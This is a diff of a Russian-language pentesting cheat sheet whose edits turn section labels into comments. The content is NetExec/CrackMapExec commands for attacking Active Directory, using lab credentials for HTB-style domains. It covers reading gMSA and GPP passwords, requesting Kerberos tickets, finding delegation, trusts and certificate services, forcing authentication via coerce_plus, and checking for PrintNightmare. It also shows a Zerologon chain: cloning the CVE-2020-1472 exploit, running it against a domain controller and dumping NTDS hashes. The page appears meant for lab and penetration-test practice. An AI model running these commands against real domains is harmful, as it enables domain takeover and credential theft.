@@ -222,28 +222,28 @@
 # Перечисление учетных записей с привилегиями gMSA
 		nxc winrm dc01.inlanefreight.htb -u robert -p Inlanefreight01! -X "Get-ADServiceAccount -Filter * -Properties 
 
-(чтение GMSA)  nxc ldap dc01.mirage.htb -u javier.mmarshall -p 'Password123' -k --gmsa 
+# (чтение GMSA)  nxc ldap dc01.mirage.htb -u javier.mmarshall -p 'Password123' -k --gmsa 
 		
-		(Поиск учетных записей в объектах групповой политики)
+# (Поиск учетных записей в объектах групповой политики)
 		nxc smb <IP-адрес> -u <имя_пользователя> -p <пароль> -M gpp_autologin 
 		nxc smb <IP-адрес> -u <имя_пользователя> -p <пароль> -M gpp_password
 		
-  		(получение tgt) nxc smb -u nathan.aadam -p '3edc#EDC3' -d mirage.htb -k --generate-tgt nathan.aadam dc01.mirage.htb
+# (получение tgt) nxc smb -u nathan.aadam -p '3edc#EDC3' -d mirage.htb -k --generate-tgt nathan.aadam dc01.mirage.htb
 				
- 		(Нахождение делегирования)  nxc ldap  10.10.11.78 -u mark.bbond -p '1day@atime' -k --trusted-for-delegation --find-delegation   
+# (Нахождение делегирования)  nxc ldap  10.10.11.78 -u mark.bbond -p '1day@atime' -k --trusted-for-delegation --find-delegation   
 		
-		(Нахождение доверительных доменов)	nxc ldap -u john.w -p 'RFulUtONCOL!' -d darkzero.htb dc01.darkzero.htb --dc-list
+# (Нахождение доверительных доменов)	nxc ldap -u john.w -p 'RFulUtONCOL!' -d darkzero.htb dc01.darkzero.htb --dc-list
 		
-   		(поиск центра сертификации)	crackmapexec ldap 'dc.sequel.htb' -d 'sequel.htb' -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs  	
+# (поиск центра сертификации)	crackmapexec ldap 'dc.sequel.htb' -d 'sequel.htb' -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs  	
   		
-		(Уязвимые для атак перенаправления серверы )	nxc smb 10.10.1.50 -u kemг -p password -M coersce_plus		
+# (Уязвимые для атак перенаправления серверы )	nxc smb 10.10.1.50 -u kemг -p password -M coersce_plus		
 								proxychains nxc smb DC01 -u svc_sql -p 'jkhnrjk123!' -M coerce_plus -o LISTENER=srv01 ALWAYS=TRUE
-		nxc smb dc1.corp.com -u '' -p '' -M zerologon	(git clone https://github.com/dirkjanm/CVE-2020-1472 -q)
+# (проверка zerologon) nxc smb dc1.corp.com -u '' -p '' -M zerologon	(git clone https://github.com/dirkjanm/CVE-2020-1472 -q)
 
 			---proxychains4 -q python3 cve-2020-1472-exploit.py dc01 172.16.10.3 
 			---nxc smb 172.16.10.3 -u 'DC01$' -p '' --ntds
 		
-		nxc smb dc1.corp.com -u '' -p '' -M printnightmare
+# (Проверка printnightmare) nxc smb dc1.corp.com -u '' -p '' -M printnightmare
 
 		(скрипт проверки найтмор)	/printnightmare -check dc.com.com/user\@termit-win(хост) -no-pass -k 		
 
